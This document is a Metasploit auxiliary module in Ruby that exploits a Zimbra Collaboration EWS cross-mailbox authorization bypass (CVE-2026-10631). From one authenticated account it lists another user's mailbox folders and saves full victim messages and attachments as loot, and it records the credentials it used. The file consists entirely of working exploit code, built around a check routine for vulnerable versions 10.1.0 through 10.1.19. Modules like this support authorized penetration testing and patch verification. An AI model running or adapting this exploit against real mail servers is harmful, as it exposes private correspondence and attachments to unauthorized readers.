##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'base64'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Zimbra
  prepend Msf::Exploit::Remote::AutoCheck

  EWS_SOAP_NS = 'http://schemas.xmlsoap.org/soap/envelope/'
  EWS_MESSAGES_NS = 'http://schemas.microsoft.com/exchange/services/2006/messages'
  EWS_TYPES_NS = 'http://schemas.microsoft.com/exchange/services/2006/types'
  EWS_PATHS = [
    %w[service extension zimbraews],
    %w[EWS Exchange.asmx]
  ].freeze
  FOLDER_NAMES = {
    1 => 'Root',
    2 => 'Inbox',
    3 => 'Trash',
    4 => 'Junk',
    5 => 'Sent',
    6 => 'Drafts',
    7 => 'Contacts',
    10 => 'Calendar',
    13 => 'Emailed Contacts',
    14 => 'Chat',
    15 => 'Tasks',
    16 => 'Briefcase'
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Zimbra EWS Cross-Mailbox FindItem Authorization Bypass',
        'Description' => %q{
          Zimbra Collaboration Network Edition's Exchange Web Services extension accepts
          composite folder identifiers containing an account UUID. In affected versions,
          FindItem constructs its authorization context from the mailbox selected by that
          UUID instead of the account that authenticated. This permits an EWS-enabled user
          to read another account's messages, MIME content, and attachments without a share
          or delegation grant.

          This module resolves the victim UUID through authenticated Zimbra SOAP, verifies
          that EWS works for the attacker's own mailbox, and then exercises the vulnerable
          FindItem path. LIST stores selected folder metadata as CSV loot. READ finds a
          selected item within that folder and stores its complete MIME message as loot.

          Zimbra 10.1.0 through 10.1.19 are affected. Zimbra 10.1.20 fixes the issue.
        },
        'Author' => [
          'Crypto-Cat' # Discovery, analysis, PoC, and module development
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-10631'],
          ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories']
        ],
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Actions' => [
          ['LIST', { 'Description' => 'List items in a victim mailbox folder' }],
          ['READ', { 'Description' => 'Save a victim message and its attachments as complete MIME' }]
        ],
        'DefaultAction' => 'LIST',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Username of an EWS-enabled account']),
        OptString.new('PASSWORD', [true, 'Password of the EWS-enabled account']),
        OptString.new('VICTIM', [true, 'Victim account email address']),
        OptInt.new('FOLDER', [true, 'Numeric victim folder ID', 2]),
        OptInt.new('MAX_ITEMS', [true, 'Maximum number of items to list or scan', 20]),
        OptInt.new('PAGE_SIZE', [true, 'Maximum items requested in each FindItem page', 20]),
        OptInt.new('ITEM_ID', [false, 'Numeric victim item ID for READ'], conditions: ['ACTION', '==', 'READ'])
      ]
    )
  end

  def check
    reset_target_state_if_needed
    victim_error = zimbra_account_name_error(datastore['VICTIM'], 'VICTIM')
    return Msf::Exploit::CheckCode::Unknown(victim_error) if victim_error

    context = prepare_context
    return check_code_for_context(context) unless context[:status] == :success

    own_result = ews_find_item_page(nil, folder_id: 2, limit: 1, offset: 0, base_shape: 'IdOnly')
    record_ews_service(own_result, context)
    return check_code_for_own_ews(own_result, context[:version]) unless own_result[:status] == :success

    own_items = parse_find_page(own_result, nil, offset: 0)
    return check_code_for_own_ews(own_items, context[:version]) unless own_items[:status] == :success

    record_successful_ews_login(own_result)
    access_control = ews_get_folder(context[:victim_uuid], folder_id: 2)
    unless access_control[:status] == :access_denied
      if access_control[:status] == :success
        return Msf::Exploit::CheckCode::Detected(
          "GetFolder accessed #{context[:victim]}; existing delegation or a share was not excluded#{version_suffix(context[:version])}"
        )
      end

      return Msf::Exploit::CheckCode::Unknown(
        "Unable to establish that access to #{context[:victim]} is unauthorized: #{result_reason(access_control)}#{version_suffix(context[:version])}"
      )
    end

    victim_result = ews_find_item_page(context[:victim_uuid], folder_id: 2, limit: 1, offset: 0, base_shape: 'IdOnly')
    case victim_result[:status]
    when :success
      victim_items = parse_find_page(victim_result, context[:victim_uuid], offset: 0)
      return Msf::Exploit::CheckCode::Unknown(victim_items[:reason]) unless victim_items[:status] == :success

      Msf::Exploit::CheckCode::Vulnerable(
        "FindItem accessed #{context[:victim]} after GetFolder denied access#{version_suffix(context[:version])}",
        vuln: { service: @ews_service }
      )
    when :access_denied
      Msf::Exploit::CheckCode::Safe("FindItem denied access to #{context[:victim]}#{version_suffix(context[:version])}")
    else
      Msf::Exploit::CheckCode::Unknown(
        "Unable to determine cross-mailbox behavior: #{result_reason(victim_result)}#{version_suffix(context[:version])}"
      )
    end
  end

  def run
    reset_target_state_if_needed
    validate_options!

    context = prepare_context
    fail_for_context!(context) unless context[:status] == :success

    own_result = ews_find_item_page(nil, folder_id: 2, limit: 1, offset: 0, base_shape: 'IdOnly')
    record_ews_service(own_result, context)
    fail_for_own_ews!(own_result) unless own_result[:status] == :success
    own_items = parse_find_page(own_result, nil, offset: 0)
    fail_for_own_ews!(own_items) unless own_items[:status] == :success
    record_successful_ews_login(own_result)

    access_control = ews_get_folder(context[:victim_uuid], folder_id: datastore['FOLDER'])
    context[:authorization_bypass] = access_control[:status] == :access_denied
    unless context[:authorization_bypass]
      print_warning("FindItem access will not be reported as a vulnerability because GetFolder did not deny the victim folder: #{result_reason(access_control)}")
    end

    case action.name
    when 'LIST'
      action_list(context)
    when 'READ'
      action_read(context)
    end
  end

  def report_vuln(opts = {})
    super(opts.merge(service: opts[:service] || @ews_service))
  end

  private

  def reset_target_state_if_needed
    target_key = [rhost, rport, ssl, vhost, target_uri.path, workspace]
    return if @target_key == target_key

    @target_key = target_key
    @ews_path = nil
    @ews_service = nil
    @ews_service_recorded = false
    @ews_login_recorded_for = nil
  end

  def action_list(context)
    folder = datastore['FOLDER']
    listed = list_folder(
      context[:victim_uuid],
      folder_id: folder,
      maximum: datastore['MAX_ITEMS'],
      page_size: datastore['PAGE_SIZE']
    )
    fail_for_ews!(listed, "list #{context[:victim]}'s folder") unless listed[:status] == :success

    table = Rex::Text::Table.new(
      'Header' => "#{context[:victim]} - #{folder_name(folder)}",
      'Columns' => ['Item ID', 'Class', 'Read', 'From', 'Subject']
    )
    listed[:items].each do |item|
      table << [item[:id], item[:item_class], item[:is_read], item[:from], item[:subject]]
    end

    if listed[:items].empty?
      print_status("#{context[:victim]}'s #{folder_name(folder)} contains no items")
    else
      print_line(table.to_s)
      path = store_loot(
        'zimbra.ews.mailbox_list', 'text/csv', rhost, table.to_csv,
        "#{loot_label(context[:victim])}_folder_#{folder}.csv",
        "#{context[:victim]} #{folder_name(folder)} listing", @ews_service
      )
      print_good("Stored #{listed[:items].length} item entries in #{path}")
    end
    report_cross_access(context, "listed #{context[:victim]}'s #{folder_name(folder)}") if context[:authorization_bypass]
  end

  def action_read(context)
    folder = datastore['FOLDER']
    read = find_message(
      context[:victim_uuid],
      folder_id: folder,
      item_id: datastore['ITEM_ID'],
      maximum: datastore['MAX_ITEMS'],
      page_size: datastore['PAGE_SIZE']
    )
    fail_for_ews!(read, 'retrieve the victim message with FindItem') unless read[:status] == :success

    mime = read.dig(:item, :mime)
    fail_with(Failure::UnexpectedReply, 'FindItem returned the selected item without MIME content') if mime.blank?

    decoded = decode_mime(mime)
    fail_with(Failure::UnexpectedReply, 'FindItem returned invalid base64 MIME content') unless decoded

    path = store_loot(
      'zimbra.ews.message', 'message/rfc822', rhost, decoded,
      "#{loot_label(context[:victim])}_message_#{datastore['ITEM_ID']}.eml",
      "Message from #{context[:victim]}'s #{folder_name(folder)}", @ews_service
    )
    print_good("Stored victim message #{datastore['ITEM_ID']} and its attachments in #{path}")
    if context[:authorization_bypass]
      report_cross_access(context, "read message #{datastore['ITEM_ID']} from #{context[:victim]}'s #{folder_name(folder)}")
    end
  end

  def validate_options!
    victim_error = zimbra_account_name_error(datastore['VICTIM'], 'VICTIM')
    fail_with(Failure::BadConfig, victim_error) if victim_error

    fail_with(Failure::BadConfig, 'FOLDER must be greater than zero') unless datastore['FOLDER'].positive?
    fail_with(Failure::BadConfig, 'MAX_ITEMS must be between 1 and 10,000') unless datastore['MAX_ITEMS'].between?(1, 10_000)
    fail_with(Failure::BadConfig, 'PAGE_SIZE must be between 1 and 1,000') unless datastore['PAGE_SIZE'].between?(1, 1_000)

    if action.name == 'READ' && !datastore['ITEM_ID']&.positive?
      fail_with(Failure::BadConfig, 'ITEM_ID must be greater than zero')
    end
  end

  def prepare_context
    authentication = zimbra_authenticate(datastore['USERNAME'], datastore['PASSWORD'])
    return authentication unless authentication[:status] == :success

    info = zimbra_get_info(authentication[:token])
    attacker = if info[:status] == :success && info[:id].present?
                 { status: :success, uuid: info[:id], name: info[:name] }
               else
                 account_name = info[:status] == :success ? info[:name] : datastore['USERNAME']
                 resolve_zimbra_account(authentication[:token], account_name)
               end
    return attacker.merge(reason: "Unable to resolve the attacker account: #{result_reason(attacker)}") unless attacker[:status] == :success

    victim = resolve_zimbra_account(authentication[:token], datastore['VICTIM'])
    return victim.merge(reason: "Unable to resolve VICTIM: #{result_reason(victim)}") unless victim[:status] == :success
    return { status: :bad_config, reason: 'VICTIM resolves to the authenticated account' } if victim[:uuid].casecmp?(attacker[:uuid])

    {
      status: :success,
      attacker_uuid: attacker[:uuid],
      victim_uuid: victim[:uuid],
      attacker: attacker[:name] || datastore['USERNAME'],
      victim: victim[:name] || datastore['VICTIM'],
      version: info[:status] == :success ? info[:version] : nil
    }
  end

  def resolve_zimbra_account(token, account_name)
    result = zimbra_account_info(token, account_name)
    return result unless result[:status] == :success

    {
      status: :success,
      uuid: result[:id],
      name: result[:name]
    }
  end

  def ews_find_item_page(owner_uuid, folder_id:, limit:, offset:, base_shape:, include_mime: false)
    document = ews_envelope do |xml|
      xml['m'].FindItem('Traversal' => 'Shallow') do
        xml['m'].ItemShape do
          xml['t'].BaseShape(base_shape)
          xml['t'].IncludeMimeContent('true') if include_mime
        end
        xml['m'].IndexedPageItemView('MaxEntriesReturned' => limit.to_s, 'Offset' => offset.to_s, 'BasePoint' => 'End')
        xml['m'].ParentFolderIds { xml['t'].FolderId('Id' => folder_identifier(owner_uuid, folder_id)) }
      end
    end
    ews_request(document, 'FindItem')
  end

  def ews_get_folder(owner_uuid, folder_id:)
    document = ews_envelope do |xml|
      xml['m'].GetFolder do
        xml['m'].FolderShape { xml['t'].BaseShape('IdOnly') }
        xml['m'].FolderIds { xml['t'].FolderId('Id' => folder_identifier(owner_uuid, folder_id)) }
      end
    end
    ews_request(document, 'GetFolder')
  end

  def ews_envelope
    Nokogiri::XML::Builder.new(encoding: 'UTF-8') do |xml|
      xml['soap'].Envelope(
        'xmlns:soap' => EWS_SOAP_NS,
        'xmlns:m' => EWS_MESSAGES_NS,
        'xmlns:t' => EWS_TYPES_NS
      ) do
        xml['soap'].Header { xml['t'].RequestServerVersion('Version' => 'Exchange2013') }
        xml['soap'].Body { yield xml }
      end
    end.to_xml
  end

  def ews_request(document, operation)
    return ews_request_at(document, operation, @ews_path) if @ews_path

    last_result = nil
    EWS_PATHS.each do |path|
      last_result = ews_request_at(document, operation, path)
      next if %i[not_ews endpoint_not_found].include?(last_result[:status])

      @ews_path = path
      return last_result
    end

    last_result || { status: :endpoint_not_found, operation: operation, reason: 'The EWS endpoint was not found' }
  end

  def ews_request_at(document, operation, path)
    response = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, *path),
      'headers' => {
        'SOAPAction' => "\"#{EWS_MESSAGES_NS}/#{operation}\"",
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
      },
      'ctype' => 'text/xml; charset=utf-8',
      'data' => document
    )
    return { status: :unreachable, operation: operation, reason: 'No response from EWS' } unless response

    if html_response?(response)
      return { status: :no_access, operation: operation, reason: "EWS returned HTTP #{response.code}" } if [401, 403].include?(response.code)
      return { status: :endpoint_not_found, operation: operation, reason: 'The EWS endpoint was not found' } if [404, 405].include?(response.code)

      return { status: :not_ews, operation: operation, reason: "HTTP #{response.code} returned HTML instead of EWS" }
    end

    parsed = parse_xml_response(response)
    if parsed[:status] != :success
      return { status: :no_access, operation: operation, reason: "EWS returned HTTP #{response.code}" } if [401, 403].include?(response.code)
      return { status: :endpoint_not_found, operation: operation, reason: 'The EWS endpoint was not found' } if [404, 405].include?(response.code)

      return parsed.merge(operation: operation)
    end

    namespaces = { 'soap' => EWS_SOAP_NS, 'm' => EWS_MESSAGES_NS }
    fault = parsed[:document].at_xpath('/soap:Envelope/soap:Body/soap:Fault', namespaces)
    if fault
      fault_code = soap_fault_code(parsed[:document])
      status = fault_code == 'service.PERM_DENIED' ? :access_denied : :ews_error
      return {
        status: status,
        operation: operation,
        document: parsed[:document],
        response: response,
        path: path,
        code: fault_code,
        reason: "EWS #{operation} returned SOAP fault #{fault_code || 'without a code'}"
      }
    end

    return { status: :no_access, operation: operation, reason: "EWS returned HTTP #{response.code}" } if [401, 403].include?(response.code)
    return { status: :endpoint_not_found, operation: operation, reason: 'The EWS endpoint was not found' } if [404, 405].include?(response.code)

    messages = parsed[:document].xpath(
      "/soap:Envelope/soap:Body/m:#{operation}Response/m:ResponseMessages/m:#{operation}ResponseMessage", namespaces
    )
    unless messages.length == 1
      return { status: :malformed, operation: operation, reason: "EWS #{operation} returned #{messages.length} response messages; expected one" }
    end

    message = messages.first
    response_codes = message.xpath('./m:ResponseCode', namespaces)
    message_texts = message.xpath('./m:MessageText', namespaces)
    if response_codes.length > 1 || message_texts.length > 1
      return { status: :malformed, operation: operation, reason: "EWS #{operation} returned duplicate response fields" }
    end

    response_class = message['ResponseClass']
    response_code = response_codes.first&.text
    message_text = message_texts.first&.text.to_s.strip
    code_less_denial = response_code.blank? && message_text.match?(/permission denied|do not have sufficient permissions/i)
    # Zimbra 10.1.16 dereferences a nil folder for an unshared foreign composite ID; the same ID succeeds after a read grant.
    code_less_denial ||= response_code.blank? && operation == 'GetFolder' &&
                         message_text.include?('getEffectiveACL()') && message_text.match?(/folder.*null/i)
    unless response_code.present? || (response_class == 'Error' && code_less_denial)
      return { status: :malformed, operation: operation, reason: "EWS #{operation} omitted a valid ResponseCode" }
    end

    status = if response_class == 'Success' && response_code == 'NoError'
               response.code == 200 ? :success : :ews_error
             elsif response_class == 'Error' && (response_code == 'ErrorAccessDenied' || code_less_denial)
               :access_denied
             elsif response_class == 'Error' && response_code == 'ErrorFolderNotFound'
               :not_found
             else
               :ews_error
             end
    reason = if status == :ews_error && response_class == 'Success' && response_code == 'NoError'
               "EWS #{operation} returned HTTP #{response.code} with a success-shaped body"
             else
               "EWS #{operation} returned #{response_class || 'no ResponseClass'}/#{response_code || 'no ResponseCode'}#{message_text.present? ? ": #{message_text}" : ''}"
             end
    {
      status: status,
      operation: operation,
      message: message,
      document: parsed[:document],
      response: response,
      path: path,
      response_class: response_class,
      code: response_code,
      reason: reason
    }
  end

  def html_response?(response)
    content_type = response.headers['Content-Type'].to_s
    body = response.body.to_s.lstrip
    content_type.match?(%r{text/html}i) || body.match?(/\A(?:<!doctype\s+html\b|<html\b)/i)
  end

  def parse_xml_response(response)
    document = response.get_xml_document
    return { status: :malformed, reason: "HTTP #{response.code} returned malformed or empty XML" } if document.root.nil? || document.errors.any?

    { status: :success, document: document }
  end

  def soap_fault_code(document)
    document.xpath('//*[local-name()="Fault"]//*[local-name()="Code"]').map { |node| node.text.strip }.find { |value| value.include?('.') }
  end

  def list_folder(owner_uuid, folder_id:, maximum:, page_size:)
    items = []
    seen_ids = {}
    offset = 0
    scanned = 0
    total = nil

    while scanned < maximum
      requested = [page_size, maximum - scanned].min
      page = ews_find_item_page(owner_uuid, folder_id: folder_id, limit: requested, offset: offset, base_shape: 'AllProperties')
      return page unless page[:status] == :success

      parsed = parse_find_page(page, owner_uuid, offset: offset)
      return parsed unless parsed[:status] == :success
      if total && parsed[:total] != total
        return { status: :unexpected, reason: 'FindItem reported a changed folder total while LIST was paging' }
      end

      returned = parsed[:items].length
      scanned += returned
      total ||= parsed[:total]
      parsed[:items].each do |item|
        next if seen_ids[item[:raw_id]] || items.length >= maximum

        items << item
        seen_ids[item[:raw_id]] = true
      end

      break if parsed[:last] || returned.zero? || (total && offset + returned >= total)

      offset += returned
    end

    { status: :success, items: items, total: total }
  end

  def find_message(owner_uuid, folder_id:, item_id:, maximum:, page_size:)
    offset = 0
    scanned = 0
    total = nil

    while scanned < maximum
      requested = [page_size, maximum - scanned].min
      page = ews_find_item_page(owner_uuid, folder_id: folder_id, limit: requested, offset: offset, base_shape: 'IdOnly')
      return page unless page[:status] == :success

      parsed = parse_find_page(page, owner_uuid, offset: offset)
      return parsed unless parsed[:status] == :success
      if total && parsed[:total] != total
        return { status: :unexpected, reason: 'FindItem reported a changed folder total while READ was paging' }
      end

      total ||= parsed[:total]

      if parsed[:items].any? { |item| item[:id] == item_id }
        detailed_page = ews_find_item_page(
          owner_uuid,
          folder_id: folder_id,
          limit: requested,
          offset: offset,
          base_shape: 'AllProperties',
          include_mime: true
        )
        return detailed_page unless detailed_page[:status] == :success

        detailed = parse_find_page(detailed_page, owner_uuid, offset: offset)
        return detailed unless detailed[:status] == :success
        if detailed[:total] != total
          return { status: :unexpected, reason: 'FindItem reported a changed folder total while READ was retrieving MIME content' }
        end

        item = detailed[:items].find { |candidate| candidate[:id] == item_id }
        return { status: :not_found, reason: 'The selected message moved while FindItem was retrieving its MIME content' } unless item

        return { status: :success, item: item }
      end

      returned = parsed[:items].length
      scanned += returned
      break if parsed[:last] || returned.zero? || offset + returned >= total

      offset += returned
    end

    { status: :not_found, reason: "Item #{item_id} was not found within the newest #{maximum} folder items" }
  end

  def parse_find_page(result, owner_uuid, offset:)
    namespaces = { 'm' => EWS_MESSAGES_NS, 't' => EWS_TYPES_NS }
    root = result[:message].at_xpath('./m:RootFolder', namespaces)
    return { status: :malformed, reason: 'FindItem response omitted RootFolder' } unless root

    items = root.xpath('./t:Items/*', namespaces).map { |node| parse_item_node(node, owner_uuid) }
    invalid = items.find { |item| item[:status] != :success }
    return invalid if invalid

    total = integer_attribute(root, 'TotalItemsInView')
    return { status: :malformed, reason: 'FindItem response omitted a valid TotalItemsInView' } unless total

    if items.empty? && (offset < total || root['IncludesLastItemInRange'] == 'false')
      return { status: :malformed, reason: 'FindItem returned an empty page while indicating more items exist' }
    end

    {
      status: :success,
      items: items,
      total: total,
      last: root['IncludesLastItemInRange'] == 'true'
    }
  end

  def parse_item_node(node, owner_uuid)
    namespaces = { 't' => EWS_TYPES_NS }
    raw_id = node.at_xpath('./t:ItemId', namespaces)&.[]('Id')
    return { status: :malformed, reason: 'FindItem returned an item without an identifier' } unless raw_id

    if owner_uuid
      expected_prefix = "#{owner_uuid}_"
      return { status: :malformed, reason: 'FindItem returned an item belonging to a different mailbox' } unless raw_id.start_with?(expected_prefix)

      id_text = raw_id.delete_prefix(expected_prefix)
    else
      id_text = raw_id
    end
    return { status: :malformed, reason: 'FindItem returned a non-numeric item identifier' } unless id_text.match?(/\A[1-9]\d*\z/)

    {
      status: :success,
      raw_id: raw_id,
      id: id_text.to_i,
      item_class: node.at_xpath('./t:ItemClass', namespaces)&.text || '?',
      is_read: node.at_xpath('./t:IsRead', namespaces)&.text || '?',
      from: mailbox_display(node.at_xpath('./t:From/t:Mailbox', namespaces)) || '?',
      subject: node.at_xpath('./t:Subject', namespaces)&.text || '(no subject)',
      mime: node.at_xpath('./t:MimeContent', namespaces)&.text
    }
  end

  def mailbox_display(mailbox)
    return unless mailbox

    namespaces = { 't' => EWS_TYPES_NS }
    name = mailbox.at_xpath('./t:Name', namespaces)&.text
    address = mailbox.at_xpath('./t:EmailAddress', namespaces)&.text
    return "#{name} <#{address}>" if name.present? && address.present?

    name.presence || address.presence
  end

  def record_ews_service(result, context)
    return if (@ews_service_recorded && @ews_service&.id) || result[:message].nil?
    return unless framework.db&.active

    common = { host: rhost, port: rport, proto: 'tcp' }
    tcp_service = common.merge(name: 'tcp', parents: nil)
    web_service = if ssl
                    common.merge(name: 'https', parents: common.merge(name: 'ssl', parents: tcp_service))
                  else
                    common.merge(name: 'http', parents: tcp_service)
                  end
    info = 'Zimbra Exchange Web Services'
    info = "#{info} #{context[:version]}" if context[:version].present?
    @ews_service = report_service(
      common.merge(
        name: 'zimbra-ews',
        info: info,
        resource: { uri: normalize_uri(target_uri.path, *@ews_path) },
        parents: web_service
      )
    )
    @ews_service_recorded = true if @ews_service
  end

  def record_successful_ews_login(result)
    login_key = [@target_key, datastore['USERNAME'], datastore['PASSWORD']]
    return if @ews_login_recorded_for == login_key
    return unless framework.db&.active

    service_data = {
      origin_type: :service,
      address: rhost,
      port: rport,
      service_name: 'zimbra-ews',
      protocol: 'tcp',
      access_level: 'user'
    }
    service_data[:service_id] = @ews_service.id if @ews_service
    store_valid_credential(
      user: datastore['USERNAME'],
      private: datastore['PASSWORD'],
      private_type: :password,
      proof: result[:code],
      service_data: service_data
    )
    @ews_login_recorded_for = login_key
  end

  def report_cross_access(context, evidence)
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: fullname,
      refs: references,
      info: "Authenticated FindItem #{evidence} as #{context[:attacker]}"
    )
  end

  def check_code_for_context(context)
    Msf::Exploit::CheckCode::Unknown(result_reason(context))
  end

  def check_code_for_own_ews(result, version)
    reason = "#{result_reason(result)}#{version_suffix(version)}"
    case result[:status]
    when :not_ews, :endpoint_not_found
      Msf::Exploit::CheckCode::Safe(reason)
    when :access_denied, :no_access
      Msf::Exploit::CheckCode::Unknown("The authenticated account cannot exercise EWS: #{reason}")
    else
      Msf::Exploit::CheckCode::Unknown("Unable to verify EWS: #{reason}")
    end
  end

  def fail_for_context!(result)
    case result[:status]
    when :unreachable
      fail_with(Failure::Unreachable, result_reason(result))
    when :auth_failed, :authentication_incomplete
      fail_with(Failure::NoAccess, result_reason(result))
    when :not_found, :bad_config
      fail_with(Failure::BadConfig, result_reason(result))
    when :soap_fault
      if %w[service.PERM_DENIED service.AUTH_REQUIRED].include?(result[:fault_code])
        fail_with(Failure::NoAccess, result_reason(result))
      end

      fail_with(Failure::UnexpectedReply, result_reason(result))
    else
      fail_with(Failure::UnexpectedReply, result_reason(result))
    end
  end

  def fail_for_own_ews!(result)
    case result[:status]
    when :unreachable
      fail_with(Failure::Unreachable, result_reason(result))
    when :no_access, :access_denied
      fail_with(Failure::NoAccess, "The authenticated account cannot exercise EWS: #{result_reason(result)}")
    when :not_ews, :endpoint_not_found
      fail_with(Failure::NotFound, result_reason(result))
    else
      fail_with(Failure::UnexpectedReply, result_reason(result))
    end
  end

  def fail_for_ews!(result, operation)
    message = "Unable to #{operation}: #{result_reason(result)}"
    case result[:status]
    when :unreachable
      fail_with(Failure::Unreachable, message)
    when :access_denied, :no_access
      fail_with(Failure::NoAccess, message)
    when :not_found
      fail_with(Failure::NotFound, message)
    else
      fail_with(Failure::UnexpectedReply, message)
    end
  end

  def result_reason(result)
    result[:reason].presence || result[:fault_code].presence || result[:code].presence || result[:http_code].presence || result[:status].to_s
  end

  def folder_identifier(owner_uuid, folder_id)
    owner_uuid ? "#{owner_uuid}_#{folder_id}" : folder_id.to_s
  end

  def integer_attribute(node, name)
    value = node[name]
    value.to_i if value&.match?(/\A\d+\z/)
  end

  def valid_uuid?(value)
    value&.match?(Msf::Exploit::Remote::HTTP::Zimbra::ACCOUNT_UUID_PATTERN)
  end

  def decode_mime(data)
    Base64.strict_decode64(data.delete(" \t\r\n"))
  rescue ArgumentError
    nil
  end

  def folder_name(folder_id)
    FOLDER_NAMES[folder_id] || "Folder #{folder_id}"
  end

  def loot_label(value)
    value.gsub(/[^A-Za-z0-9._-]+/, '_')
  end

  def version_suffix(version)
    version.present? ? " on Zimbra #{version}" : ''
  end
end
